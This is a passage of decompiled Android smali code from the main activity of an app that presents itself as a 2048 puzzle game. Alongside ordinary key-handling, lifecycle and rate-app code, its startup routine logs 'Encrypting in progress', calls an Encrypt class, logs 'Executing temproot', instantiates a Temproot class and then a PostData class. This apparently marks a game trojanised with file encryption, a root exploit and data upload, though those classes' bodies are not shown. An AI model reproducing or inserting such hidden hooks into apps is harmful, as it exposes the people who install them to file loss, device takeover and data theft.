    :try_start_0
    const-string v7, "Encrypting in progress"

    invoke-static {v8, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 106
    const/4 v7, 0x1

    const-string v9, ""

    invoke-static {v7, v4, v3, v9}, Laarkay/a2048game/Encrypt;->init(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 107
    :catch_0
    move-exception v7

    .line 108
    .local v7, "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->printStackTrace()V

    .line 109
    .end local v7    # "e":Ljava/io/IOException;
    :goto_1
    nop

    .line 117
    :goto_2
    :try_start_1
    const-string v7, "Executing temproot"

    invoke-static {v8, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 118
    new-instance v7, Laarkay/a2048game/Temproot;

    invoke-direct {v7, p0}, Laarkay/a2048game/Temproot;-><init>(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 121
    goto :goto_3

    .line 119
    :catch_1
    move-exception v7

    .line 120
    .restart local v7    # "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->printStackTrace()V

    .line 125
    .end local v7    # "e":Ljava/io/IOException;
    :goto_3
    :try_start_2
    new-instance v7, Laarkay/a2048game/PostData;

    invoke-direct {v7, p0}, Laarkay/a2048game/PostData;-><init>(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 128
    goto :goto_4

    .line 126
    :catch_2
    move-exception v7

    .line 127
    .restart local v7    # "e":Ljava/io/IOException;
    invoke-virtual {v7}, Ljava/io/IOException;->printStackTrace()V

    .line 131
    .end local v7    # "e":Ljava/io/IOException;
    :goto_4
    const v7, 0x7f090056

    invoke-virtual {p0, v7}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroidx/appcompat/widget/Toolbar;

    .line 132
    .local v7, "bottomBar":Landroidx/appcompat/widget/Toolbar;
    const/high16 v8, 0x7f0d0000

    invoke-virtual {v7, v8}, Landroidx/appcompat/widget/Toolbar;->inflateMenu(I)V

    .line 133
    new-instance v8, Laarkay/a2048game/MainActivity$2;

    invoke-direct {v8, p0}, Laarkay/a2048game/MainActivity$2;-><init>(Laarkay/a2048game/MainActivity;)V

    invoke-virtual {v7, v8}, Landroidx/appcompat/widget/Toolbar;->setOnMenuItemClickListener(Landroidx/appcompat/widget/Toolbar$OnMenuItemClickListener;)V

    .line 151
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v8

    .line 152
    .local v8, "settings":Landroid/content/SharedPreferences;
    iget-object v9, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    const/4 v10, 0x0

    const-string v11, "save_state"

    invoke-interface {v8, v11, v10}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v10

    iput-boolean v10, v9, Laarkay/a2048game/MainView;->hasSaveState:Z

    .line 154
    if-eqz p1, :cond_3

    .line 155
    const-string v9, "hasState"

    invoke-virtual {p1, v9}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_3

    .line 156
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->mb807559a()V

    .line 161
    :cond_3
    new-instance v9, Laarkay/a2048game/MainActivity$3;

    invoke-direct {v9, p0}, Laarkay/a2048game/MainActivity$3;-><init>(Laarkay/a2048game/MainActivity;)V

    iput-object v9, p0, Laarkay/a2048game/MainActivity;->t:Ljava/lang/Thread;

    .line 181
    invoke-virtual {v9}, Ljava/lang/Thread;->start()V

    .line 183
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 3
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .line 187
    const/4 v0, 0x1

    const/16 v1, 0x52

    if-ne p1, v1, :cond_0

    .line 189
    return v0

    .line 190
    :cond_0
    const/16 v1, 0x14

    if-ne p1, v1, :cond_1

    .line 191
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 v2, 0x2

    invoke-virtual {v1, v2}, Laarkay/a2048game/MainGame;->move(I)V

    .line 192
    return v0

    .line 193
    :cond_1
    const/16 v1, 0x13

    if-ne p1, v1, :cond_2

    .line 194
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Laarkay/a2048game/MainGame;->move(I)V

    .line 195
    return v0

    .line 196
    :cond_2
    const/16 v1, 0x15

    if-ne p1, v1, :cond_3

    .line 197
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 v2, 0x3

    invoke-virtual {v1, v2}, Laarkay/a2048game/MainGame;->move(I)V

    .line 198
    return v0

    .line 199
    :cond_3
    const/16 v1, 0x16

    if-ne p1, v1, :cond_4

    .line 200
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    invoke-virtual {v1, v0}, Laarkay/a2048game/MainGame;->move(I)V

    .line 201
    return v0

    .line 203
    :cond_4
    invoke-super {p0, p1, p2}, Landroidx/appcompat/app/AppCompatActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    return v0
.end method

.method protected onPause()V
    .locals 1

    .line 215
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onPause()V

    .line 216
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->m4e23b8e0()V

    .line 217
    const/4 v0, 0x0

    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    .line 218
    return-void
.end method

.method protected onResume()V
    .locals 1

    .line 222
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onResume()V

    .line 223
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->mb807559a()V

    .line 224
    const/4 v0, 0x1

    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    .line 225
    return-void
.end method

.method public onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 208
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onSaveInstanceState(Landroid/os/Bundle;)V

    .line 209
    const-string v0, "hasState"

    const/4 v1, 0x1

    invoke-virtual {p1, v0, v1}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 210
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->m4e23b8e0()V

    .line 211
    return-void
.end method

.method protected onStop()V
    .locals 1

    .line 229
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onStop()V

    .line 230
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->m4e23b8e0()V

    .line 231
    const/4 v0, 0x0

    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    .line 232
    return-void
.end method

.method public rateApp()V
    .locals 2

    .line 314
    :try_start_0
    const-string v0, "market://details"

    invoke-direct {p0, v0}, Laarkay/a2048game/MainActivity;->mcac365e8(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 315
    .local v0, "rateIntent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 319
    .end local v0    # "rateIntent":Landroid/content/Intent;
    goto :goto_0

    .line 316
    :catch_0
    move-exception v0

    .line 317
    .local v0, "e":Landroid/content/ActivityNotFoundException;
    const-string v1, "https://play.google.com/store/apps/details"

    invoke-direct {p0, v1}, Laarkay/a2048game/MainActivity;->mcac365e8(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 318
    .local v1, "rateIntent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 320
    .end local v0    # "e":Landroid/content/ActivityNotFoundException;
    .end local v1    # "rateIntent":Landroid/content/Intent;
    :goto_0
    return-void
.end method
